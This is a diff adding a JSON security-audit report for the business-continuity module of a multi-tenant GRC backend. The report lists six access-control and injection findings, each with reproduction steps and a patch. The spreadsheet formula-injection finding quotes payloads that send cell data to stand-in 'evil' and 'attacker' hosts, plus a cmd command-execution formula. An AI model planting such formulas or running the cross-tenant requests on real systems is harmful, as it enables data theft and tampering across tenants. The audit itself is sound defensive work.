@@ -1,0 +1,178 @@
+{
+  "findings": [
+    {
+      "id": "SEC-BCM-001",
+      "title": "Cross-tenant read/update/delete of BIA records via unscoped BiaRecordRepository (IDOR)",
+      "phase": "Security",
+      "category": "Broken Access Control / IDOR (A01) — CWE-639",
+      "severity": "High",
+      "cvss": "CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) — authenticated cross-tenant read AND write of Business Impact Analysis data",
+      "file": "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/service/BcmService.java",
+      "lines": "200-237",
+      "locations": [
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/repository/BiaRecordRepository.java:10-13",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/controller/BcmController.java:147-171",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/entity/BiaRecord.java:13-46"
+      ],
+      "description": "The legacy BCM service handles BiaRecord (the bcm.bia_records table holding RTO/RPO/MTPD recovery objectives and overall impact classification) with NO tenant scoping at any of read, update, or delete. (1) listBia(processId) calls biaRepo.findByProcessId(processId, ...) directly with a caller-supplied processId and never checks that the process or the returned BIA rows belong to TenantContext's organisation. (2) updateBia(id, req) loads the row by biaRepo.findById(id) with no org filter, then mutates and saves it, AND copies req.getProcessId() onto it — allowing a tenant-A user to overwrite a tenant-B BIA and even re-point it to an arbitrary process. (3) deleteBia(id) calls biaRepo.deleteById(id) with no org filter and no soft-delete — a hard cross-tenant delete. The root enabler is that BiaRecordRepository exposes only findByProcessId / findByProcessIdIn / inherited findById/deleteById (no *OrganisationId finder), the BiaRecord entity has no organisationId column and no @Where soft-delete clause, and createBia() (line 216) never stamps an organisation at all. The endpoints (GET/PUT/DELETE /api/v1/bcm/bia) are reachable by any BCM:READ/WRITE/DELETE holder.",
+      "rootCause": "BiaRecord was modelled as a child of CriticalProcess (tenant scoping intended to be 'inherited via the parent process link') but the service never actually resolves the parent process to enforce that link. The repository provides no organisation-scoped finder, so every code path that touches a BIA by id or processId is implicitly global.",
+      "evidence": "BcmService.listBia: `if (processId != null) return biaRepo.findByProcessId(processId, Pageable.unpaged()).getContent();`  BcmService.updateBia: `BiaRecord existing = biaRepo.findById(id).orElseThrow(...); existing.setProcessId(req.getProcessId()); ... return biaRepo.save(existing);`  BcmService.deleteBia: `biaRepo.deleteById(id);`  Comment at line 211-215 explicitly admits 'BiaRecord doesn't carry an organisationId column directly ... the platform-wide tenant guarantee for this entity comes from the BiaRecordRepository query layer' — but the query layer provides no such guarantee.",
+      "impact": "An authenticated user in tenant A (a Saudi bank) can enumerate processId values and read the recovery objectives and impact ratings of any other tenant on the platform (e.g. Aramco Trading, STC Bank), overwrite another tenant's BIA, or permanently delete it. BIA data is sensitive regulatory artefact (SAMA BCF / ISO 22301) and cross-tenant tampering corrupts a competitor's continuity posture and audit trail.",
+      "reproduction": "1. Log in as a BCM user in tenant A. 2. GET /api/v1/bcm/bia?processId=<id-belonging-to-tenant-B> → returns tenant B's BIA rows. 3. PUT /api/v1/bcm/bia/<biaId-of-tenant-B> with a body to overwrite RTO/MTPD → 200, tenant B's data mutated. 4. DELETE /api/v1/bcm/bia/<biaId-of-tenant-B> → 204, row hard-deleted from another tenant.",
+      "resolution": "Add an organisationId column to bia_records (or always resolve the parent CriticalProcess and enforce its org) and rewrite all three operations to be tenant-scoped: validate the parent process belongs to TenantContext.getCurrentTenant() on create/list, and load BIAs through an org-scoped finder before update/delete. Replace deleteById with a soft-delete that re-loads under the tenant filter.",
+      "patchBefore": "@Transactional(readOnly = true)\npublic List<BiaRecord> listBia(Long processId) {\n    if (processId != null) return biaRepo.findByProcessId(processId, Pageable.unpaged()).getContent();\n    ...\n}\n@Transactional\npublic BiaRecord updateBia(Long id, BiaRecord req) {\n    BiaRecord existing = biaRepo.findById(id)\n        .orElseThrow(() -> new EntityNotFoundException(\"BIA record not found: \" + id));\n    existing.setProcessId(req.getProcessId());\n    ...\n}\n@Transactional\npublic void deleteBia(Long id) {\n    biaRepo.deleteById(id);\n}",
+      "patchAfter": "private CriticalProcess requireOwnedProcess(Long processId) {\n    return processRepo.findById(processId)\n        .filter(p -> p.getOrganisationId().equals(TenantContext.getCurrentTenant()))\n        .orElseThrow(() -> new EntityNotFoundException(\"Process not found: \" + processId));\n}\nprivate BiaRecord requireOwnedBia(Long id) {\n    BiaRecord b = biaRepo.findById(id)\n        .orElseThrow(() -> new EntityNotFoundException(\"BIA record not found: \" + id));\n    requireOwnedProcess(b.getProcessId());   // throws if parent process is another tenant's\n    return b;\n}\n@Transactional(readOnly = true)\npublic List<BiaRecord> listBia(Long processId) {\n    if (processId != null) { requireOwnedProcess(processId); return biaRepo.findByProcessId(processId, Pageable.unpaged()).getContent(); }\n    ...\n}\n@Transactional\npublic BiaRecord updateBia(Long id, BiaRecord req) {\n    BiaRecord existing = requireOwnedBia(id);\n    requireOwnedProcess(req.getProcessId());\n    ...\n}\n@Transactional\npublic void deleteBia(Long id) {\n    BiaRecord b = requireOwnedBia(id);\n    b.setStatus(\"DELETED\");   // or soft-delete flag once column exists\n    biaRepo.save(b);\n}",
+      "effort": "M",
+      "references": [
+        "CWE-639: Authorization Bypass Through User-Controlled Key",
+        "OWASP API1:2023 Broken Object Level Authorization",
+        "OWASP A01:2021 Broken Access Control"
+      ]
+    },
+    {
+      "id": "SEC-BCM-002",
+      "title": "Function-level authorization too broad: ~30 BCM cycle/DRP endpoints gated only by isAuthenticated()",
+      "phase": "Security",
+      "category": "Broken Function Level Authorization (A01) — CWE-285",
+      "severity": "Medium",
+      "cvss": "CVSS 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L) — any authenticated user of any role can mutate BCM crisis/plan/risk state",
+      "file": "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/controller/CrisisEventController.java",
+      "lines": "104-130",
+      "locations": [
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/controller/BcpPlanController.java:60-154",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/controller/BcmRiskController.java:53-122",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/controller/BcmRemediationController.java:57-143",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/controller/BcmCycleController.java:51-103",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/controller/BcmAuditCompletionController.java:58-109",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/controller/BcmBiaAssessmentController.java:58-143",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/drp/controller/DrPlanController.java:28-78"
+      ],
+      "description": "Across the bcm/cycle and bcm/drp subtrees, roughly 30 write and read endpoints are annotated `@PreAuthorize(\"isAuthenticated()\")` instead of the platform's documented `hasPermission('BCM','READ|WRITE|DELETE')` model (per CLAUDE.md and as correctly used by BcmController and bcm_lc/InvocationController). Because method security is enabled (SecurityConfig: @EnableMethodSecurity(prePostEnabled = true)), these annotations ARE enforced — but only to the level of 'has a valid JWT'. Any authenticated principal — including a read-only AUDITOR, or a user whose role grants no BCM module permission at all — can therefore create/update/transition/delete crisis events, BCP/DRP plans, BCM risks, gaps/CAPAs, assessment cycles, BIA assessments, and management reviews, and can fire the SIEM webhook that auto-escalates to a CrisisEvent (BcmAuditCompletionController.ingestSiem, severity>=3). Tenant isolation still holds (services scope by TenantContext), so this is intra-tenant privilege escalation / BFLA, not cross-tenant exposure.",
+      "rootCause": "These controllers were built ahead of the BCM permission wiring and used isAuthenticated() as a placeholder; the TODO is even acknowledged inline on the SIEM webhook ('accepts any authenticated caller for now'). The module's own correct pattern (hasPermission) was never back-filled here.",
+      "evidence": "CrisisEventController create: `@PostMapping  @PreAuthorize(\"isAuthenticated()\")  public ResponseEntity<CrisisEvent> create(@Valid @RequestBody CrisisEvent body)`. CrisisEventController delete-equivalent transition and activate-bcp/drp all `@PreAuthorize(\"isAuthenticated()\")`. BcmAuditCompletionController.ingestSiem (line 91-95) `@PreAuthorize(\"isAuthenticated()\")` with comment 'Webhook ingest — accepts any authenticated caller for now.' grep over the package found 30+ isAuthenticated() occurrences on mapped methods.",
+      "impact": "A low-privilege or read-only user (e.g. AUDITOR, or any tenant employee with a JWT) can tamper with live crisis management: open or close crisis events, activate/deactivate BCP/DRP plans, alter risk scores, delete remediation gaps/CAPAs, or inject a fake high-severity SIEM alert that spins up a real crisis event — undermining segregation of duties required by ISO 22301 / SAMA BCF governance.",
+      "reproduction": "1. Log in as an AUDITOR (read-only seeded role) or any user lacking BCM:WRITE. 2. POST /api/v1/bcm/crisis-events with a minimal valid body → 200 Created. 3. POST /api/v1/bcm/crisis-events/{id}/transition {to:'CANCELLED'} → succeeds. 4. POST /api/v1/bcm/siem-events {severity:5,title:'x'} → auto-creates a CrisisEvent. None of these should be permitted for a read-only role.",
+      "resolution": "Replace `isAuthenticated()` with the module permission expressions: `hasPermission('BCM','READ')` on GET endpoints, `hasPermission('BCM','WRITE')` on POST/PUT/PATCH/transition, `hasPermission('BCM','DELETE')` on delete/archive. For the SIEM webhook, require a dedicated permission (e.g. BCM:INGEST) or a shared-secret integration credential rather than a user JWT.",
+      "patchBefore": "@PostMapping\n@PreAuthorize(\"isAuthenticated()\")\npublic ResponseEntity<CrisisEvent> create(@Valid @RequestBody CrisisEvent body) {\n    return ResponseEntity.ok(service.create(body));\n}",
+      "patchAfter": "@PostMapping\n@PreAuthorize(\"hasPermission('BCM','WRITE')\")\npublic ResponseEntity<CrisisEvent> create(@Valid @RequestBody CrisisEvent body) {\n    return ResponseEntity.ok(service.create(body));\n}",
+      "effort": "M",
+      "references": [
+        "CWE-285: Improper Authorization",
+        "OWASP API5:2023 Broken Function Level Authorization",
+        "OWASP A01:2021 Broken Access Control"
+      ]
+    },
+    {
+      "id": "SEC-BCM-003",
+      "title": "Read-only AUDITOR role granted write/approve/delete on BIA, ROI and crisis-comms endpoints",
+      "phase": "Security",
+      "category": "Broken Function Level Authorization (A01) — CWE-269",
+      "severity": "Medium",
+      "cvss": "CVSS 5.4 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L) — segregation-of-duties violation, write granted to read role",
+      "file": "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/controller/BiaQuantitativeController.java",
+      "lines": "47-104",
+      "locations": [
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/controller/StrategyRoiController.java:1-200",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/comms/controller/CrisisCommsTemplateController.java:1-90"
+      ],
+      "description": "BiaQuantitativeController applies a single CLASS-level `@PreAuthorize(\"hasAnyRole('BCM_MANAGER','CISO','PLATFORM_ADMIN','RISK_MANAGER','AUDITOR','CFO')\")` to ALL nine endpoints, including create, update, submit, cfo-approve, board-approve and DELETE/archive. The same broad role set therefore lets an AUDITOR (a read-only assurance role) and a RISK_MANAGER create and mutate quantitative BIAs and even archive them — there is no per-method narrowing that restricts write/approval verbs to the appropriate roles. The same pattern (read roles permitted to mutate) appears on the crisis-comms template controller. This breaks segregation of duties: an auditor signing off on a control they themselves can edit is a governance integrity failure even though tenant isolation is intact (the service scopes by TenantContext.requireOrganisationId via loadOrThrow).",
+      "rootCause": "Authorization expressed once at class level with the union of every role that needs ANY access, instead of per-method role sets that separate read from write/approve. The class-level grant is the lowest common denominator and over-grants the write verbs.",
+      "evidence": "Class annotation: `@PreAuthorize(\"hasAnyRole('BCM_MANAGER','CISO','PLATFORM_ADMIN','RISK_MANAGER','AUDITOR','CFO')\")`. Methods create()/update()/cfoApprove()/boardApprove()/archive() carry NO method-level @PreAuthorize, so all inherit the class grant — AUDITOR can POST/PUT/DELETE.",
+      "impact": "An auditor can fabricate or alter the financial avoidable-loss inputs that feed StrategyRoiService board recommendations, or archive a quantitative BIA, defeating the four-eyes / SoD controls expected by SAMA and an external ISO 22301 auditor.",
+      "reproduction": "1. Log in as AUDITOR. 2. POST /api/v1/bcm/bia/quantitative with a valid body → 201 Created (should be 403). 3. DELETE /api/v1/bcm/bia/quantitative/{externalId} → 200 archived.",
+      "resolution": "Keep the broad read grant at class level but add method-level `@PreAuthorize` that restricts writes/approvals: create/update to BCM_MANAGER/CISO/PLATFORM_ADMIN; cfo-approve to CFO/PLATFORM_ADMIN; board-approve to BOARD_MEMBER/PLATFORM_ADMIN; archive to BCM_MANAGER/PLATFORM_ADMIN. Remove AUDITOR/RISK_MANAGER from any mutating verb.",
+      "patchBefore": "@RestController\n@RequestMapping(\"/api/v1/bcm/bia/quantitative\")\n@PreAuthorize(\"hasAnyRole('BCM_MANAGER','CISO','PLATFORM_ADMIN','RISK_MANAGER','AUDITOR','CFO')\")\npublic class BiaQuantitativeController {\n    @PostMapping\n    public BiaQuantitativeResponse create(@RequestBody @Valid BiaQuantitativeRequest req) { ... }\n    @DeleteMapping(\"/{externalId}\")\n    public ResponseEntity<BiaQuantitativeResponse> archive(@PathVariable UUID externalId) { ... }",
+      "patchAfter": "@RestController\n@RequestMapping(\"/api/v1/bcm/bia/quantitative\")\n@PreAuthorize(\"hasAnyRole('BCM_MANAGER','CISO','PLATFORM_ADMIN','RISK_MANAGER','AUDITOR','CFO')\")  // read floor\npublic class BiaQuantitativeController {\n    @PostMapping\n    @PreAuthorize(\"hasAnyRole('BCM_MANAGER','CISO','PLATFORM_ADMIN')\")\n    public BiaQuantitativeResponse create(@RequestBody @Valid BiaQuantitativeRequest req) { ... }\n    @DeleteMapping(\"/{externalId}\")\n    @PreAuthorize(\"hasAnyRole('BCM_MANAGER','PLATFORM_ADMIN')\")\n    public ResponseEntity<BiaQuantitativeResponse> archive(@PathVariable UUID externalId) { ... }",
+      "effort": "S",
+      "references": [
+        "CWE-269: Improper Privilege Management",
+        "OWASP A01:2021 Broken Access Control",
+        "ISO 22301 §5.3 segregation of duties"
+      ]
+    },
+    {
+      "id": "SEC-BCM-004",
+      "title": "Crisis-comms dispatch trusts client-supplied actor identity and unverified crisisEventId",
+      "phase": "Security",
+      "category": "Insufficient verification of data authenticity (A04/A08) — CWE-345",
+      "severity": "Low",
+      "cvss": "CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N) — audit-trail spoofing / cross-event data placement",
+      "file": "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/comms/service/CrisisCommsDispatchService.java",
+      "lines": "102-160",
+      "locations": [
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/comms/dto/CrisisCommsDtos.java:76-85",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/comms/controller/CrisisCommsDispatchController.java:40-45"
+      ],
+      "description": "The dispatch endpoint records WHO dispatched a crisis communication from request body fields dispatchedByName / dispatchedByUserId rather than from the authenticated principal, so an operator can attribute a cascade to any name/user id. Separately, while the template is verified to belong to the tenant (findByOrganisationIdAndIdAndIsDeletedFalse) and to be APPROVED_BY_CISO, the crisisEventId from the request is stored on the CrisisCommsCascade row without verifying that the crisis event exists in the caller's tenant — so a cascade can be filed under an arbitrary or non-existent crisis event id. The recipients list is arbitrary client-supplied strings (validated only @NotBlank); currently harmless because all ChannelSender implementations are stubs, but becomes a sensitive-data/spam vector once real EMAIL/SMS/WhatsApp integrations land.",
+      "rootCause": "Actor identity and the crisisEventId association are taken from the untrusted request body instead of being derived from the security context (actor) and validated against tenant-scoped repositories (crisisEventId).",
+      "evidence": "DispatchRequest record fields: `@Size(max=255) String dispatchedByName, Long dispatchedByUserId`. Service: `c.setDispatchedByName(req.dispatchedByName()); c.setDispatchedByUserId(req.dispatchedByUserId()); c.setCrisisEventId(req.crisisEventId());` — no SecurityContext lookup, no crisisEvents.findByIdAndOrganisationId(req.crisisEventId()) check.",
+      "impact": "An authorized dispatcher can repudiate or misattribute a crisis communication in the audit log, and can associate cascade rows with crisis events that belong to another tenant or do not exist, polluting per-event timelines and undermining the F7 audit trail regulators rely on.",
+      "reproduction": "1. As a CISO/COMMS_LEAD, POST /api/v1/bcm/comms/v2/dispatch with dispatchedByName='Someone Else', dispatchedByUserId=<other user> and crisisEventId=<arbitrary>. 2. Observe the persisted cascade + audit row attribute the action to the spoofed identity and the bogus event id.",
+      "resolution": "Derive dispatchedByName/dispatchedByUserId from SecurityContextHolder (the authenticated GrcUserDetails), ignoring any client-supplied values, and validate req.crisisEventId() with a tenant-scoped crisis-event lookup before persisting the cascade.",
+      "patchBefore": "c.setCrisisEventId(req.crisisEventId());\nc.setDispatchedByName(req.dispatchedByName());\nc.setDispatchedByUserId(req.dispatchedByUserId());",
+      "patchAfter": "crisisEvents.findByIdAndOrganisationId(req.crisisEventId(), orgId)\n    .orElseThrow(() -> new EntityNotFoundException(\"Crisis event not in tenant: \" + req.crisisEventId()));\nGrcUserDetails me = (GrcUserDetails) SecurityContextHolder.getContext().getAuthentication().getPrincipal();\nc.setCrisisEventId(req.crisisEventId());\nc.setDispatchedByName(me.getDisplayName());\nc.setDispatchedByUserId(me.getId());",
+      "effort": "S",
+      "references": [
+        "CWE-345: Insufficient Verification of Data Authenticity",
+        "CWE-639: Authorization Bypass Through User-Controlled Key",
+        "OWASP A08:2021 Software and Data Integrity Failures"
+      ]
+    },
+    {
+      "id": "SEC-BCM-005",
+      "title": "CSV/spreadsheet formula injection in BCM audit evidence package export",
+      "phase": "Security",
+      "category": "Injection (A03) — CWE-1236 CSV Formula Injection",
+      "severity": "Low",
+      "cvss": "CVSS 3.5 (AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N) — code execution on the auditor's machine when opening the export",
+      "file": "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/service/BcmEvidencePackageService.java",
+      "lines": "313-337",
+      "locations": [
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/cycle/service/BcmEvidencePackageService.java:167-196"
+      ],
+      "description": "The evidence package generator writes user-controlled free-text fields into audit_log.csv (the AuditLogEntry.message column, plus entityCode/severity) and into the .xlsx sheets (BIA mbco, gap/CAPA descriptions, treatment plans, etc.). The CSV writer's csv() helper only quotes values containing comma/quote/newline; it does NOT neutralise values that begin with =, +, -, @ or tab/CR. When a regulator or external auditor opens the exported CSV/XLSX in Excel or LibreOffice, such a cell is interpreted as a formula (e.g. =cmd|'/c calc'!A1 or =HYPERLINK/WEBSERVICE exfiltration). Because the message text is attacker-influenceable upstream (titles, codes, notes flow into audit messages), a tenant user can plant a malicious formula that executes on the auditor's workstation when the official evidence pack is reviewed.",
+      "rootCause": "Export routines escape for CSV delimiter safety only, not for spreadsheet formula safety; no leading-character neutralisation is applied before writing user-controlled strings to CSV/XLSX cells.",
+      "evidence": "csv() helper: `if (v.contains(\",\") || v.contains(\"\\\"\") || v.contains(\"\\n\")) { return \"\\\"\" + v.replace(\"\\\"\",\"\\\"\\\"\") + \"\\\"\"; } return v;` — a value like `=WEBSERVICE(\"http://evil/?\"&A1)` is emitted verbatim. writeAuditCsv appends csv(e.getMessage()) directly.",
+      "impact": "Formula injection executing in the context of whoever opens the official BCM evidence bundle (typically an external auditor or SAMA/NCA reviewer) — data exfiltration or command execution on a trusted reviewer's machine, with the file carrying the platform's integrity SHA-256 manifest lending it false trust.",
+      "reproduction": "1. Create a BCM artefact whose name/notes is `=HYPERLINK(\"http://attacker/\"&A1,\"click\")` (or `=cmd|'/c calc'!A1`). 2. Trigger evidence-package generation for the cycle. 3. Open audit_log.csv / the xlsx in Excel — the formula evaluates.",
+      "resolution": "Prefix any cell value beginning with =, +, -, @, tab or CR with a single quote (or a leading space) before writing, in both the CSV writer and the XLSX cell setters. Centralise this in a sanitizeForSpreadsheet() helper.",
+      "patchBefore": "private static String csv(String v) {\n    if (v == null) return \"\";\n    if (v.contains(\",\") || v.contains(\"\\\"\") || v.contains(\"\\n\")) {\n        return \"\\\"\" + v.replace(\"\\\"\", \"\\\"\\\"\") + \"\\\"\";\n    }\n    return v;\n}",
+      "patchAfter": "private static String csv(String v) {\n    if (v == null) return \"\";\n    String s = neutraliseFormula(v);\n    if (s.contains(\",\") || s.contains(\"\\\"\") || s.contains(\"\\n\")) {\n        return \"\\\"\" + s.replace(\"\\\"\", \"\\\"\\\"\") + \"\\\"\";\n    }\n    return s;\n}\nprivate static String neutraliseFormula(String v) {\n    if (!v.isEmpty() && \"=+-@\\t\\r\".indexOf(v.charAt(0)) >= 0) return \"'\" + v;\n    return v;\n}\n// apply neutraliseFormula(...) to String cell values in writeXlsx / writeGapsAndCapasXlsx too",
+      "effort": "S",
+      "references": [
+        "CWE-1236: Improper Neutralization of Formula Elements in a CSV File",
+        "OWASP A03:2021 Injection",
+        "OWASP CSV Injection guidance"
+      ]
+    },
+    {
+      "id": "SEC-BCM-006",
+      "title": "Mass-assignment cross-tenant write backstop (TenantWriteGuardInterceptor) is stubbed and not wired",
+      "phase": "Security",
+      "category": "Broken Access Control / Mass Assignment (A01/A08) — CWE-915",
+      "severity": "Info",
+      "cvss": "Defense-in-depth gap — relies entirely on per-service req.setId(null); no platform backstop",
+      "file": "tss-grc-backend/src/main/java/com/tss/grc/common/tenant/TenantWriteGuardInterceptor.java",
+      "lines": "36-78",
+      "locations": [
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/controller/BcmController.java:69-75",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/controller/BcmController.java:128-134",
+        "tss-grc-backend/src/main/java/com/tss/grc/module/bcm/service/BcmService.java:77-83"
+      ],
+      "description": "Several BCM write endpoints bind raw JPA entities directly via @RequestBody (BcmController.createPlan/updatePlan/createProcess/updateProcess/createBia/createExercise take BcmPlan/CriticalProcess/BiaRecord/BcmExercise, not validated DTOs). The cross-tenant mass-assignment defense for these is purely the per-service convention of calling req.setId(null) and req.setOrganisationId(currentTenant) before save. The documented platform-wide backstop, TenantWriteGuardInterceptor, is explicitly NOT ACTIVE (its own Javadoc: 'Wiring status — NOT YET ACTIVE ... This bean exists as a stub'). For SEC-BCM-001 (createBia) the per-service defense is itself missing (no setOrganisationId). The create* paths that DO call setId(null)+setOrganisationId are presently safe, and the update* paths re-load an org-scoped entity and copy only whitelisted fields, so this is a defense-in-depth/info-level observation that amplifies the impact of any future endpoint that forgets the convention.",
+      "rootCause": "Tenant-write integrity depends on a hand-applied per-method convention with no enforced backstop; the interceptor designed to catch omissions has never been wired into the Hibernate SessionFactory.",
+      "evidence": "TenantWriteGuardInterceptor Javadoc lines 36-48: 'Wiring status — NOT YET ACTIVE. This bean exists as a stub so it can be code-reviewed and unit-tested before being wired into the EntityManager / SessionFactory.' BcmController.createPlan: `public BcmPlan createPlan(@RequestBody BcmPlan req)` — raw entity, no @Valid; defense is BcmService.createPlan `req.setId(null); req.setOrganisationId(TenantContext.getCurrentTenant());`.",
+      "impact": "No direct exploit today on the create/update paths that follow the convention, but the platform has no enforced guard against a future (or already-missed, see SEC-BCM-001) write path that omits the id-null / org-stamp step, which would allow cross-tenant overwrite via JPA merge of an id-bearing body.",
+      "reproduction": "N/A (defense-in-depth). Confirmable by code review: the interceptor is never registered via HibernatePropertiesCustomizer or hibernate.session_factory.interceptor.",
+      "resolution": "Complete the interceptor wiring per its own pre-activation checklist (register via a HibernatePropertiesCustomizer bean, wrap legitimate cross-tenant sweeps in TenantContext.allowCrossTenantWrite(), add the attack-simulation tests), and migrate raw-entity @RequestBody write endpoints to validated request DTOs so organisationId/id can never be bound from the client.",
+      "patchBefore": "// application.yml — interceptor not referenced anywhere; raw entity bound:\n@PostMapping(\"/legacy-plans\")\npublic BcmPlan createPlan(@RequestBody BcmPlan req) { return bcmService.createPlan(req); }",
+      "patchAfter": "@Bean\nHibernatePropertiesCustomizer tenantGuard(TenantWriteGuardInterceptor i) {\n    return props -> props.put(\"hibernate.session_factory.interceptor\", i);\n}\n// and bind a DTO instead of the entity:\n@PostMapping(\"/legacy-plans\")\npublic BcmPlan createPlan(@RequestBody @Valid BcmPlanRequest req) { return bcmService.createPlan(req); }",
+      "effort": "L",
+      "references": [
+        "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes (Mass Assignment)",
+        "OWASP A08:2021 Software and Data Integrity Failures",
+        "OWASP API6:2023 Unrestricted Access to Sensitive Business Flows"
+      ]
+    }
+  ]
+}
